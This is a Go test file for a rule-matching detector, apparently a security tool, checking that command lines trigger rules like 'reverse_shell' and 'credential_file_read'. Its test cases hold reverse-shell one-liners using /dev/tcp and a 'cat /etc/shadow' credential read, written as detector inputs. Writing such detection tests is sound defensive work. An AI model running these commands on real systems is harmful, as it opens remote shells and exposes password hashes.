package main

import (
	"bytes"
	"strings"
	"testing"
)

func TestRunCheck(t *testing.T) {
	cases := []struct {
		name     string
		args     []string
		wantRule string // "" = expect no match
	}{
		{
			name:     "reverse shell via field flag + command line",
			args:     []string{"-image", "/bin/bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"},
			wantRule: "reverse_shell",
		},
		{
			name:     "credential read needs both reader and secret",
			args:     []string{"-image", "/usr/bin/cat", "cat /etc/shadow"},
			wantRule: "credential_file_read",
		},
		{
			name:     "json event",
			args:     []string{"-json", `{"image":"/bin/bash","commandLine":"bash -c 'sh >& /dev/tcp/1.2.3.4/9'"}`},
			wantRule: "reverse_shell",
		},
		{
			name:     "benign, no match",
			args:     []string{"-image", "/bin/ls", "ls -la"},
			wantRule: "",
		},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			var stdout, stderr bytes.Buffer
			if err := runCheck(tc.args, &stdout, &stderr); err != nil {
				t.Fatalf("runCheck: %v\nstderr: %s", err, stderr.String())
			}
			out := stdout.String()
			if tc.wantRule == "" {
				if !strings.Contains(out, "no rules matched") {
					t.Errorf("expected no match, got:\n%s", out)
				}
				return
			}
			if !strings.Contains(out, tc.wantRule) {
				t.Errorf("expected rule %q in output, got:\n%s", tc.wantRule, out)
			}
		})
	}
}

func TestRunCheckBadJSON(t *testing.T) {
	var stdout, stderr bytes.Buffer
	if err := runCheck([]string{"-json", "{not json"}, &stdout, &stderr); err == nil {
		t.Error("expected an error for bad -json")
	}
}
